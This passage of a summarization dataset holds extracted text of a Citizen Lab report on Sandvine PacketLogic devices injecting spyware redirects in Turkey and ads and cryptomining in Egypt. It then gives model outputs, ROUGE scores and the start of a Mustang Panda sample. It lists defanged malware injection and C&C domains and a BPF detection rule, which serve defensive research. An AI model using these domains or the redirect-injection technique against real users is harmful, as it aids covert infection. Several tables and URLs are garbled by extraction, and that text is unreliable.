redirect matching the format in Figure 1 using the URL url records the sample as being downloaded from that it was running cPanel, and the email address associated with the cPanel installation was an email address we know to be associated with the TRD based on past work the Citizen Lab has conducted. We conducted Internet scanning of Egypt, sending every IPv4 address an HTTP request to download the TrueCrypt setup file, but did not find any spyware injection. However, we discovered a system we call AdHose that was redirecting Egyptian Internet users to affiliate ads and cryptocurrency mining scripts.Figure 13: Diagram of how AdHose seems to work in Egypt.We identify two modes of AdHose. In spray mode, a middlebox redirects Egyptian Internet users en masse to ads or cryptocurrency mining scripts whenever they make a request to any website. In trickle mode, only requests to certain URLs are redirected. It appears that spray mode is enabled sparingly, whereas trickle mode appears to be in operation mostly continuously.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/21/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?5.3. Discovering AdHose When checking Shodan for HTTP 307 redirects (Section 3.2), we noticed a large number of redirects returned by Egyptian IPs to what appeared to be an advertising site (Figure 14). The site embedded further redirects to affiliate ads.HTTP/1.1 307 Temporary Redirect Location: url Connection: closeFigure 14: Suspicious HTTP redirect returned by Egyptian IPs.While we were conducting an (unrelated) scan of the IPv4 Internet (from outside Egypt), we captured these redirects being injected, solely for IP addresses in Egypt. The redirects were injected during 32 minutes of our scan (on January 8, 2018 between 10:23:36 \u2013 10:55:12 Egypt time). The advertising redirects were injected in response to requests we sent of the form in Figure 15 (where \u201c%s\u201d is the IP address we were scanning).GET / HTTP/1.1 Host: %s User-Agent: Mozilla/5.0Figure 15: HTTP request sent by our scan that elicited ad injection.The PCAPs we recorded during our scan show that each instance of injection matches our entire fingerprint in Section 3.3. Namely, all injected packets have IPID = 13330, no IP flags, match the expected 307 Redirect format, and involve the packet injector sending an unsolicited final ACK packet ~100ms after injecting the redirect. This indicates that the redirect was likely being injected by Sandvine PacketLogic devices as configured by the operators.During the 32 minutes on January 8 when injection was active, we both scanned and received a response containing data from 3,337 IP addresses in 27 ASNs in Egypt (as determined by MaxMind GeoLite2 country database). 1,239 IP addresses in 17 ASNs returned the advertising redirect, for an injection rate of ~38%. This appears to be an instance of the AdHose spray mode. Figure 16 shows the ASNs in which we observed injections, indicating that the middleboxes used for injection are upstream from these ASNs.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/22/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?ASN # ASN Description24863Link Egypt (Link.NET)8452Telecom Egypt (TE)20928Noor36992Etisalat Misr24835Vodafone / Raya Telecom37031 Misr Information Services & Trading (MIST)36935Vodafone37069 Mobinil33785City Net Telecom30993Egypt Centers20484Yalla Online36408CDNetworks328067 EGIT31619310652557615475City StarsEgyptian Ministry of Communications and Information Technology (MCIT)Armed Forces Main information Center (AFMIC)Nile Online (NOL)Figure 16: ASNs where we observed injection in Egypt.5.4. A multi-year campaignOONI\u2019s report and dataOur data matches up with findings that the network interference measurement project OONI published in August 2016. OONI\u2019s work revealed affiliate ad injection when users attempted to access certain pornography websites in Egypt. OONI\u2019s findings matched all elements of the fingerprint we described in Section 3.3, which suggests that the ad injection they identified in 2016 was also the result of Sandvine PacketLogic devices as configured by the operators.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/23/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Additional historical OONI data that we reviewed showed evidence that two domains, copticpope[.]org (the former website of the Pope of the Coptic Orthodox Church of Alexandria) and babylon-x[.]com (a former pornographic website), have been targeted by AdHose in trickle mode. As a result, visitors to these websites were continuously redirected to ads, regardless of whether spray mode was active. We confirmed these findings in our own scans in February 2018. We also identified an October 2016 post on Webhostingtalk which indicated that visitors to a free web counter JavaScript file, url were redirected to advertisements linked to the infinitads[.]com domain. We tested accessing this URL from within Egypt and found that it is targeted by AdHose in trickle mode.Censys captures AdHose sprayWe found that the 7547-cwmp-get-full_ipv4 Censys scan performed on January 3, 2018 captured AdHose in spray mode between 15:50:23 \u2013 16:32:02 local time. Censys both scanned and received a response containing data from 5,702 IP addresses in four ASNs in Egypt during this period. Of these 5,702 IPs, 5,443 in four ASNs returned the advertising redirect, for an injection rate of ~95%.10Enumerating affiliate IDsWe looked at historical OONI data and enumerated all HTTP 307 redirects within Egypt that did not match the domain from which they were redirected. Within this list, we looked for any domains returned which appeared to be domains hosting advertising pages (for example, we manually filtered out domains that appeared to be ISP or billing notifications). To this list, we added the injected domains that OONI previously reported.We then gathered all copies of all pages on these domains archived by the Internet Archive, and looked for affiliate links included in the HTML source of the webpages (or any pages they redirected to). We also manually visited URLs in cases where the Internet Archive did not retain past copies. As a result of this process, we obtained the list of affiliate links and IDs we believe were used by the AdHose operators, shown in Figure 17.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/24/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Affiliate IDs723454 work Affiliate LinkAdver- Ltd.url zoneid=1251527 url id=1209127url id=773263url id=896707url id=723454url Corpurl url tica.aeurl section=General&pub=175258&ga=g url section=General&pub=125652&ga=g125652 fied)url zoneId=2692073&htatb=1&sId=26920732692073url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/25/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Ad Net- work Affiliate LinkAffiliate IDsurl ing)Figure 17: Affiliate links we believe were used by AdHose operators.We saw a significant overlap between the ad networks mentioned in the OONI report and AdHose. For example, we saw in the hosting history that static.dbmads[.]com forwarded users to ad2upapp[.]com, which was mentioned in the initial OONI report. Additionally, the infinitads[.]com domain mentioned in the OONI report was forwarded to static.dbmads[.]com at several points in time. This overlap suggests to us that the same actors have been involved since at least October 2016.5.5. Localizing Egypt\u2019s middleboxesWe conducted tests that localized the AdHose middleboxes to a Telecom Egypt demarcation point.We noticed that for AdHose, the redirects were injected upon receipt of an HTTP response, rather than an HTTP request. In this case, sending a request to a server did not trigger an injected response unless the server received the request, and returned a proper HTTP response.We verified that we could configure our second-hand PacketLogic device to inject on responses rather than requests, such as by adding a condition on the injection rule that would not be known until the device saw the response (e.g., the condition \u201cHTTP response code == 200\u201d).Test 1: localizing AdHoseBecause AdHose only injects data in response to HTTP responses, sending TTL limited HTTP requests cannot localize AdHose. We instead sent a TTL-limited FIN/ACK packet after properly establishing a TCP connection, but before sending a default-TTL HTTP request with a Host header for one of the AdHose domains (copticpope[.]org). By varying the TTL of the FIN/ACK packet, we could identify the link on which the middlebox first saw the FIN/ACK (and the end-host in Egypt did not). We hypothesized that when the middlebox first saw the FIN/ACK, it might consider the connection closed and noturl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/26/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?perform any injection on the server\u2019s response. Thus, we would expect to find some number X, where setting the TTL to Y (\u2265 X) would cause us to receive the legitimate response from the server, and setting the TTL to Z (< X) would cause us to receive the redirect injected by AdHose.We did indeed observe this behavior; the first link on which we saw the legitimate response from the end-host in Egypt (and not the injected response) was between egypt.demarc.cogentco.com), which appears to be a cable link between Marseilles, France, and Egypt.Test 2: localizing censorshipIn this test, we found that the same device that was running AdHose was also performing Internet censorship in Egypt. We localized the censorship functionality of the device by sending a TTL-limited HTTP request to a blocked website (www.aljazeera.net). By varying the TTL of the HTTP request, and observing whether we received an injected egypt.demarc.cogentco.com), which appears to be the same cable link that we found in Test 1.Given that we localized both AdHose and Internet censorship to the same link, we believe that the same PacketLogic device is being used to carry out both functionalities.6. Egypt & Turkey Censorship TestingThis section describes how DPI equipment that matches our Sandvine PacketLogic fingerprint is blocking political and human rights content in Egypt and Turkey.6.1. Websites blockedIn Egypt, we found that devices matching our Sandvine PacketLogic fingerprint are being used to block dozens of human rights, political, and news websites including Human Rights Watch, Reporters Without Borders, Al Jazeera, Mada Masr, and HuffPost Arabi. In Turkey, we discovered that these devices are being used to block websites including every language version of Wikipedia, the website of the Dutch Broadcast Foundation (NOS), and the website of the PKK (Kurdistan Workers\u2019 Party).The blocking is implemented by injecting TCP reset packets. The TCP reset packets have IPID 13330, and no IP flags, and match our fingerprint (Section 3.3). These characteristics suggest that Sandvine PacketLogic devices are being used to carry out the blocking.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/27/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?6.2. Website blocking in PacketLogicWe tested blocking a website using our second-hand Sandvine PacketLogic device (Section 3.3). This test involved creating a PropertyObject to match requests whose hostname was hrw.org and then a Filtering Rule that terminates all connections matching the Property Object by using the built-in Reject action.Figure 18: How we set up our PacketLogic device to block the website of Human RightsWatch. We believe a similar setup exists in Egypt.Requests with an HTTP host header of hrw.org were terminated by an injected RST packet. Requests with a TLS client hello message with the SNI extension set to hrw.org were also terminated.Our experiment (Figure 19, Figure 20) matched elements 1-4 of our fingerprint. Note that the timestamp discrepancy in the PCAP files is because the server and client clocks were not synchronized.Client sends GET request for hrw.org17:34:54.213576 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 123) [nop,nop,TS val 756752097 ecr 2094875405], length 71: HTTP, length: 71 GET / HTTP/1.1 Host: hrw.org User-Agent: curl/7.54.0 Accept: */*Client receives injected RST/ACK17:34:54.213805 IP (tos 0x0, ttl 64, id 13330, offset 0, flags [none], proto TCP (6), lengthurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/28/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?40) 40) PartnersCitizen Lab sent letters to executive leadership at Sandvine and to Procera Networks/Sandvine owner Francisco Partners on February 12, 2018. Our letters notified the companies of our research findings and raised questions concerning their human rights impact. We received an initial response from both companies on February 13 which confirmed their receipt of our letters and indicated that they would provide us with a reply.A February 16, 2018 letter from Sandvine laid out the company\u2019s response in more detail, characterizing the statements in our letter as \u201cfalse, misleading, and wrong\u201d; demanding return of the second-hand PacketLogic device that we used to confirm attribution of our fingerprint; describing Sandvine\u2019s \u201cComprehensive Business Ethics Program\u201d; and noting that any public statements we make \u201cthat are factually inaccurate or based on improper use of [the PacketLogic] product . . . will be met with vigorous fact-based rebuttal and a strong legal response . . . .\u201d Citizen Lab replied to this email the same day noting that we had withdrawn the original publication date to carefully review the points they raised and undertake further due diligence.Sandvine asserted in its February 16 letter that its PacketLogic product \u201cis not capable of Man-in-the-Middle (MITM) attacks and not capable of any form of payload injection, malicious or not,\u201d and that Citizen Lab\u2019s findings were therefore incorrect. Our research, however, does not suggest that the PacketLogic device is capable of injecting traffic with the malicious code outright. Rather, the spyware injection and advertising injection were carried out by injecting HTTP 307 redirects that caused a target\u2019s browser to automatically fetch malicious code from a separate website. As described in Section 2, the injection of various HTTP redirects is an established spyware and advertising injection technique. Additionally, Sandvine acknowledged in its letter that the PacketLogic design \u201cdoes not permit the end user to inject a payload larger than 1 packet.\u201d This assertion, indicating an injection of one packet is possible, is consistent with our findings regarding the injection of a redirect command, which is one packet in size.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/29/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Notably, in the February 16 letter, Sandvine also expressed its commitment to the ethical use of its product. It referred to the company\u2019s webpage regarding \u201cEthics and Human Rights protection at Sandvine,\u201d which provided:11A key part of [Sandvine\u2019s] innovation process is to ensure that we do not lose sight of the ethical impact of our technology on human rights, freedom of speech, and privacy. Sandvine has taken the approach on regulating access to the components of our solutions that could be used to infringe on any of these. The usage of our regulatory compliance solutions are controlled by a EULA and software licenses that are required for any components that could conceivably be used to violate human rights, freedom of speech, and privacy.The letter noted that Sandvine\u2019s EULA prohibits injection of malicious payloads. The letter also indicated that the company maintains a Business Ethics Committee (BEC) \u201cto review and approve the sale of products and services to customers.\u201d The webpage details how Sandvine\u2019s BEC uses \u201cthe World Bank Index\u201d (an apparent reference to the Worldwide Governance Indicators) to review sales to certain countries. The BEC assesses the indicators associated with the following areas of governance: voice and accountability (which includes freedom of expression-related indicators); political stability and absence of violence/terrorism; rule of law; and control of corruption. The Sandvine webpage states:Any country not rated an \u201cA\u201d by the World Bank must be approved by the BEC and a certificate of compliance signed by the customer acknowledging that they will not use the technology to violate human rights based on the regulatory compliance use case(s) deployed. Sandvine employees and resellers are prohibited from selling solutions to countries that are embargoed or sanctioned by the EU, US, and/or UN or are rated a \u201cD\u201d by the Word Bank.It is unclear, however, what letter grade ratings are referred to in this policy, or how they are determined, as the Worldwide Governance Indicators provide percentile rankings for countries rather than a letter grade.While Sandvine did not comment on the existence or any aspect of business dealings in Egypt or Turkey, citing contract confidentiality clauses, the BEC assessment process it outlines would appear to apply to sales in both countries. The Worldwide Governance Indicators reflect the following 2016 percentile rankings (0 to 100) for Egypt and Turkey in the categories utilized by Sandvine\u2019s BEC:12Voice and accountabili- tyPolitical stability and absence of violence / terrorismEgyptTur- corruption3250url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/30/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?The low percentile rankings assigned to those countries \u2014 single digits in the \u201cpolitical stability and absence of violence / terrorism\u201d category, and in no case surpassing 50th percentile \u2014 suggest at a minimum that the BEC would have been called upon to assess and approve any such sales that took place, and require certificates of compliance from the customers.On February 20, 2018, Francisco Partners sent its own response to our letter, emphasizing that the firm \u201crecognizes the importance of corporate governance and social responsibility.\u201d The firm went on to state: \u201cWe spend considerable time and effort regarding the thoughtful development and implementation of proper governance and social responsibility policies and processes for Francisco Partners and for the companies in which we invest.\u201d The firm noted that, as an investor, it works \u201cwith company management teams to enhance (where necessary) and to implement robust corporate governance principles, business processes and policies, and business strategy, including social responsibility policies and practices.\u201d It also \u201cmandates the adoption of compliant business ethics policies and processes. Where appropriate, such policies and processes are based on, among other things, the engagement of outside parties and a variety of benchmarking information sources, including World Bank information.\u201dOn March 1, 2018, Citizen Lab replied to Sandvine. We emphasized that we were confident in our research findings, which two independent peer reviews confirmed. We also posed additional questions regarding Sandvine\u2019s business ethics program. On March 7, 2018, Sandvine sent a letter to the University of Toronto, expressing its continuing concern that the Citizen Lab report \u201cwill contain false, inaccurate and misleading information that has the potential to do significant harm to the company, its shareholders and its customers.\u201d Sandvine \u201cdemand[ed] that the report not be released publicly at this time\u201d and laid out the reasons for that demand. External counsel responded to Sandvine\u2019s letter on behalf of the University of Toronto and Citizen Lab on March 8, 2018.8. Conclusion: Dual-Use Technology, UnrestrainedDeep packet inspection technology is now ubiquitous across network environments. DPI devices supporting network injection can be used by ISPs for a range of ostensibly legitimate uses, from alerting users to billing issues to bandwidth cap limits \u2014 all broadly marketed under the rubric of what DPI companies refer to benignly as \u201cQuality of Service\u201d or \u201cQuality of Experience.\u201d However, as our investigation demonstrates, network injection can also be used for harmful purposes. Depending on how DPI systems are configured, they may even present serious human rights risks, such as censoring access to content or, worse, silently infecting users with malware, and all without the person affected by the censorship or targeted by the malware realizing what has occurred. Evidently, the technology can also be easily repurposed for mass-scale revenue scams.Despite the risks of harms and abuses, the market for this powerful technology remains largely unregulated. Export controls that were agreed upon within the framework of the Wassenaar Arrangement explicitly exclude \u201csystems or equipment, specially designed forurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/31/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?. . . a. Marketing purpose; b. Network Quality of Service (QoS); or c. Quality of Experience (QoE)\u201d from the scope of controlled IP network communications surveillance systems or equipment. Yet the integration of functions, including network injection, in a customizable, multipurpose network solution raises difficult questions regarding end use determinations and proper methods for prevention of misuse of the technology.Regardless of the specific business sector, all companies have a responsibility to prevent the misuse of their products and services in ways that undermine human rights. The UN Guiding Principles on Business and Human Rights note that businesses should \u201cavoid causing or contributing to adverse human rights impacts\u201d and \u201caddress such impacts when they occur.\u201d Moreover, the UN Guiding Principles clarify that companies should \u201cseek to prevent or mitigate adverse human rights impacts that are directly linked to their operations, products or services by their business relationships, even if they have not contributed to those impacts.\u201d As described in this report, however, Sandvine appears to have provided such tools in Turkey and Egypt \u2014 two countries with documented poor human rights records \u2014 and may have serviced these tools on the ground as well. Additionally, prior reporting of internal company discussions at Procera Networks show clearly that concerns were raised inside the company about equipping the Turkish regime with technology that could be used for surveillance. The company is or should be aware of the potential for misuse of its product in Turkey. Despite the human rights concerns raised, Sandvine/Procera evidently chose to move ahead with provision of technology to Turkey.The apparent use of Sandvine technology to engage in network injection in Egypt and Turkey is even more troubling in light of the \u201cstrong safeguards\u201d that Sandvine asserts it maintains \u201cregarding social responsibility, human rights, and privacy rights.\u201d Sandvine appears to have technical means in place to prevent misuse of its technology, noting in its February 16 letter that it \u201cimplements stringent software license controls that limit access to specific product capabilities outside of an intended use case.\u201d The malicious and dubious activities that appear to have been conducted through the use of PacketLogic devices as documented in this report suggest that Sandvine\u2019s safeguards have come up short \u2014 despite the Procera controversy over dealings in Turkey that was publicly reported in 2016, which put the company on notice of the potential human rights impact of sales and services in Turkey. We recommend that Sandvine engage in regular consultation with civil society regarding its human rights due diligence and business ethics program, and enhance transparency surrounding its sales review process and post- sale technical controls. We also recommend that Sandvine establish an operational-level grievance mechanism, in line with the UN Guiding Principles on Business and Human Rights, to address incidents of misuse of its products, and clearly communicate to the public how to report concerns, response, and remedial action taken.the timeframe in which one can expect to receive a13We recommend that both dual-use technology developers and investors carefully consider their human rights policies and due diligence practices in light of the changing regulatory and social landscape and growing expectations surrounding corporate socialurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/32/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?responsibility. Francisco Partners in particular appears to have targeted dual-use technology companies as a lucrative sector for investment, given the company\u2019s prior investment in companies such as Blue Coat and NSO Group. Proactive efforts within the firm to incorporate and promote human rights due diligence, as Francisco Partners touched on in its correspondence, could help address the risks of abuse present in this sector. We recommend that Francisco Partners publicly release its own corporate social responsibility policies and practices, as well as those that it promotes among its investment companies, and engage with civil society in a transparent manner regarding how those policies and practices could be improved. We also recommend that government entities, including the newly established Canadian Ombudsperson for Responsible Enterprise (which would have jurisdiction over Sandvine as a corporation based in Canada), consider the significant human rights implications of network tools capable of network injection in responding to the lack of oversight, transparency, and accountability in the surveillance market.The findings of this report also illustrate the urgent need for ubiquitous adoption of HTTPS by website developers. Handling web traffic over unencrypted channels leaves users vulnerable to network injection techniques that may expose them to spyware, unwanted advertising, or other Internet scams. Particularly on sites offering software downloads (some of which may be billed as \u201csecure\u201d), companies and developers responsible for such platforms must ensure the proper use of encryption.Ultimately, the use of products that provide network injection features on public ISP networks, as identified in this report, represents a major global public safety risk. Network injection can be used to take advantage of access to a user\u2019s unencrypted web traffic to replace expected data with malicious or inappropriate code, often in a manner undetectable to the average user. Francisco Partners\u2019 recent acquisition of Sandvine is especially troubling in this regard, since the investment firm\u2019s portfolio also includes NSO Group, one of the world\u2019s leading providers of spyware whose products are associated with numerous cases of abuse. The prospect of such powerhouse surveillance technologies being sold to companies operating in autocratic regimes, or autocratic regimes themselves, and in jurisdictions wherein human rights are flagrantly abused, should be cause for concern.AcknowledgementsBill Marczak\u2019s work on this project was supported by the Center for Long Term Cybersecurity (CLTC) at UC Berkeley. This work was also supported by grants to the Citizen Lab from the Ford Foundation, the John T. and Catherine D. MacArthur Foundation, the Oak Foundation, the Open Society Foundations, and the Sigrid Rausing Trust. This work includes data from the Open Observatory of Network Interference (OONI), Censys, VirusTotal, and RiskIQ.Editing and other assistance provided by Masashi Nishihata, Jeffrey Knockel, Christopher Parsons, Lex Gill, and Miles Kenyon. Research assistance provided by Elizabeth Gross and Gabrielle Lim.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/33/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Additional data can be found hereAppendix A: Turkey malware injection IOCsInitial CampaignDomains of injected redirectsdownload.downloading[.]shop downloading.syriantelecom[.]co download.syriantelecommunications[.]co redirection[.]bid14Phase 2 CampaignDomains of injected redirectsdownloading.internetdownloading[.]co storage[.]computingdownloads[.]life and-security-state[.]comPhase 4 CampaignInjection domainssolitude.file-download[.]today system.documentations[.]live epiphany.download-document[.]world epoch.wind-files[.]today epoch.uploaders[.]online solitude.filedownloads[.]online mevlut.oncu@yandex.com16Phase 5 CampaignInjection domainsdocument.downloadingsystem[.]com epoch.englishdownloaders[.]today internet.downloadingdocuments[.]com system.filedownloaders[.]comMalware C&Cupd-ms3-app-state[.]comRelated IOCs discoveredcdn6-upd-state-app.comBPF rule to detect HTTP 307 redirect injection consistent with PacketLogic:\u201cport 80 and ip[4:2] = 13330 and tcp[((tcp[12:1] & 0xf0) >> 2)+8:4] = 0x20333037 and tcp[14:2] = 32120 and ip[6:2] = 0\u201dFootnotes1. The text \u201cSECURE DOWNLOAD\u201d is displayed when a user hovers over the\u201cDOWNLOAD NOW\u201d link when attempting to download a file from Download.com.2. Found via Google search; the brochure URL includes a Hubspot Hub ID (482141)that we see in the HTML source code of the url site, thus we conclude this is an official brochure.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/36/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?3. Found via Google search; the brochure URL includes a Hubspot Hub ID (482141)that we see in the HTML source code of the url site, thus we conclude this is an official brochure.4. Our Shodan search query was: 307 temporary redirect -date -server connectionclose -content-length -pragma -usercheck -content-type location. 5. The samples were structurally similar to the ones described here. 6. See \u201cinject_data parameter requires v12.1 firmware or newer\u201d onurl For instance, Checkpoint\u2019s Secure Web Gateway appears to use the same HTTP header format as PacketLogic, but has numerous differences in the IP and TCP layers, including not using a fixed IPID value, and not injecting a final unsolicited ACK.8. Though most people would instead probably visit videolan.org, which redirectsusers to HTTPS by default.9. Also surprisingly, when we tested ccleaner.com, it directed Mac users to adownload via HTTPS, but directed PC users to a download over HTTP.10. While it is unlikely that a user would actually see an ad injected on port 7547, it appears that the DPI operator in Egypt did not restrict the network injection to a specific port. As a result, an HTTP request on any port would be injected.11. After we began corresponding with Sandvine, and apparently in March 2018,Sandvine changed the content of this webpage. The original text as of February 15, 2018 is available at url ny/corporate-ethics.12. Most recent data available as of March 7, 2018. 13. After we began corresponding with Sandvine, and apparently in March 2018, Sandvine changed the content of its \u201cEthics and Human Rights protection at Sandvine\u201d webpage to add the following text: \u201c[W]e encourage Sandvine employees and interested third parties to report any suspected breaches of a signed Sandvine certificate of compliance or breaches of Sandvine\u2019s End User License Agreement (EULA) with sufficient supporting evidence to Sandvine\u2019s BEC committee at BEC@sandvine.com for investigation. All reported concerns will be reviewed and appropriately actioned.\u201d It is unclear, however, what terms are contained in the applicable certificates of compliance or EULAs, which information would be required for the public to properly identify and report on such breaches; or what supporting evidence would be considered \u201csufficient.\u201d Additional transparency is necessary to make this mechanism effectively available to the public.14. Also seen in the Phase 2 campaign. 15. Also seen in the Phase 5 campaign. ms6[.]com) was issued to \u201cmevlut.oncu.example.com,\u201d and we found a similar- looking domain cdn6-scl-ms.com registered to mevlut.oncu@yandex.com according to the WHOIS record. That domain never pointed to an IP address, as far as we could tell.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/37/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/38/38 ", "generated_text": "a report; a series; middleboxes; the malware injection; hundreds; users; Windows; programs; legitimate users; state-state spyware; Targeted users; injected HTTP redirects; the user; a Telecom Egypt demarcation point; affiliate ads; cryptocurrency mining; data; remote access; the attackers; Turkey; APT; the Middleboxes; a second-hand PacketLogic device; a lab setting; this injection; human rights concerns; Turkey.", "ref_text": "<START-1>The report documents an investigation by Citizen Lab into the apparent use of Sandvine/Procera Networks Deep Packet Inspection (DPI) devices to surreptitiously inject malicious content or ads into Internet traffic in Turkey and Egypt. In Turkey, the devices were being used to redirect users attempting to download legitimate Windows programs to versions bundled with spyware associated with the StrongPity APT group. Targets included government critics, Kurdish regions, and Syrian Internet users. In Egypt, a system called AdHose installed on Telecom Egypt's network hijacked users' web connections to redirect them en masse to affiliate ads and browser cryptocurrency mining scripts. AdHose had been operating for years. Extended technical analysis of the injection activities matched them to a fingerprint associated with Sandvine PacketLogic devices. Citizen Lab obtained and tested a PacketLogic device to confirm it could mimic the injections. The report documents how PacketLogic can be configured for regulatory blocking of sites and content. It raises concerns about Sandvine providing such powerful dual-use systems with potential for rights abuses to countries with poor human rights records like Turkey and Egypt. Citizen Lab notified Sandvine and owner Francisco Partners of the issues prior to publication. The companies asserted strong commitment to ethical practices but did not directly address the research findings. Overall, the report illustrates how DPI technology can enable covert attacks and mass surveillance when placed in the wrong hands. It highlights the human rights risks of the unregulated dual-use surveillance industry. <END-1>", "t5/keyword/hint_hit_precision": 0.25925925925925924, "t5/word/hint_hit_recall": 0.0375, "gpt3/lexical/rouge_rouge1": 0.46590909090909083, "gpt3/lexical/rouge_rouge2": 0.19428571428571428, "gpt3/lexical/rouge_rougeL": 0.3181818181818182, "gpt3/lexical/rouge_rougeLsum": 0.3181818181818182, "gpt3_generated_text": ["This report investigates the use of Sandvine/Procera Networks Deep Packet Inspection (DPI) devices, known as middleboxes, in Turkey and Egypt. The middleboxes were found to redirect hundreds of users in Turkey and Syria to nation-state spyware when attempting to download legitimate Windows applications. Additionally, in Egypt, the middleboxes were used to hijack web connections and redirect users to affiliate ads and cryptocurrency mining scripts. The investigation linked the malicious redirection to Sandvine PacketLogic devices, raising significant human rights concerns. The use of Sandvine devices for such purposes in Turkey, Syria, and Egypt poses a threat to the privacy and security of internet users in these countries."]}, {"split_name": "val", "sample_id": "val_84", "prompt_text": "Extract the keywords: blogs.blackberry.com /en/2022/10/mustang-panda-abuses-legitimate-apps-to-target-myanmar-based-victims Mustang Panda Abuses Legitimate Apps to Target Myanmar Based Victims The BlackBerry Research & Intelligence Team \u22ee \u22ee 10/6/2022Executive SummaryThe BlackBerry Research & Intelligence Team recently uncovered a campaign by an advanced persistent threat (APT) group called Mustang Panda that is leveraging the PlugX malware family to target the Southeast Asian state of Myanmar.Our team analyzed the samples in question and found their embedded configurations revealed a set of command- and-control (C2) domains that masquerade as Myanmar news outlets. This is not the first time a campaign targeting this state has impersonated Myanmar news outlets or used PlugX malware.These tactics, techniques, and procedures (TTPs), along with other corroborating evidence \u2013 such as a previous indication that the group was active in this location \u2013 lead us to assert with reasonable confidence that the China- based threat group known as Mustang Panda is responsible for this campaign Mustang Panda: an Origin StoryMustang Panda (aka HoneyMyte, Bronze President or Red Delta) is a prolific APT group that has been publicly attributed as being based in China. This group conducted malware campaigns as far back as 2012, which primarily related to cyber-espionage.Their targets have included Government and Non-Government Organizations (NGO) in many locations around the world, from various states in Southeast Asia to the European Union to the U.S. and beyond.1/6Figure 1 \u2013 Partial map of countries previously targeted by Mustang PandaMustang Panda Attack VectorMustang Panda typically sends phishing emails with malicious document attachments as an initial infection vector. These documents are usually designed to mimic those of the targeted country or organization, or even current world affairs applicable to that region.Once threat actors gain a foothold within a target organization, they typically deploy one of a variety of payloads such as Cobalt Strike, Poison Ivy, or PlugX, the latter of which is used most extensively.Initial ThreadIn late May of this year, BlackBerry detected some unusual network traffic to a domain \u2013 www[.]myanmarnewsonline[.]org. At first glance, this URL appeared to be a Myanmar news website.The files found to be communicating with this site were encompassed in several .RAR files. These files had a relatively low detection ratio on VirusTotal (VT), and as shown in Figure 2, they followed a naming convention designed to make them appear to be legitimate utilities relating to Hewlett-Packard (HP) printers.Figure 2 \u2013 Communicating RAR filesThe RAR archives contained a legitimate signed utility from HP, along with a DLL loader and a DAT file that is an encrypted PlugX payload.One of the legitimate utilities (\u201cHPCustParticUI.exe\u201d \u2013 SHA256 fashion as part of a PlugX execution chain, which was documented by another vendor in September 2021.In early June of this year, a tweet from the user @kienbigmummy (shown in Figure 3) mentioned an additional .RAR file titled \u201cservice Log.rar\u201d that was linked with a sub-domain of the previously mentioned website \u2013 images[.]myanmarnewsonline[.]org \u2013 that was associated with PlugX and the Mustang Panda APT group.2/6Figure 3 \u2013 June 2nd PlugX tweet by @kienbigmummyWe examined the network infrastructure (shown in Figure 4) linked to each of these three RAR files, which provided evidence of additional samples that conform to the same or similar TTPs going back as far as late 2020, along with other sample types such as Cobalt Strike beacon.Figure 4 \u2013 VirusTotal graph of network infrastructureWhat is PlugX?PlugX is a remote access tool (RAT) used by several threat groups. It is the malware of choice for the Chinese APT group Mustang Panda. This group delivers the PlugX implant in the form of an 